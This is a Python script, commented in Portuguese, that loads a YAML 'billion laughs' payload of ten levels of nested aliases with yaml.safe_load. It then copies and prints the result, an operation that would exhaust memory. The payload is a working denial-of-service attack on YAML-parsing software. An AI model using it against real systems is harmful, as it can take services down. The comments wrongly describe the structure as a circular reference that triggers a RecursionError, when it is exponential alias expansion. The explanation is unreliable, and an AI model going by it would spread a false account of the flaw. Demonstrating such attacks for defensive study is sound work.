import yaml
import sys

# Exemplo de YAML com referência circular
yaml_milion_laughts = """
a: &a ["AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAA"]
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]
i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h, *h]
j: &j [*i, *i, *i, *i, *i, *i, *i, *i, *i, *i]
"""

# 1. safe_load() é bem-sucedido e retorna o objeto circular!
data = yaml.safe_load(yaml_milion_laughts)

# 2. O ataque ocorre nesta linha, se a aplicação tentar iterar/serializar
try:
    print(f"Tamanho do objeto: {sys.getsizeof(data)}")
    
    # Exemplo de operação vulnerável: tentar criar uma string gigante
    # Se você tentar imprimir a lista inteira, o Python tentará
    # representar a estrutura recursiva, o que pode levar a:
    # print(data) # Isso geralmente é evitado pelo Python, mas...
    
    # Operação de cópia/serialização que não detecta recursão
    import copy
    copia = copy.copy(data)
    print(f"Cópia criada com sucesso. Tamanho da cópia: {copia}")
    
    print(f"Cópia concluída com sucesso (IMPOSSÍVEL neste caso).")
    
except RecursionError as e:
    print(f"ERRO DE RECURSÃO detectado pelo Python: {e}")
except Exception as e:
    print(f"Outro erro durante o processamento: {e}")

# Mesmo se o Python detectar a recursão (como no print()), a simples
# existência do objeto circular ainda pode ser um problema de lógica.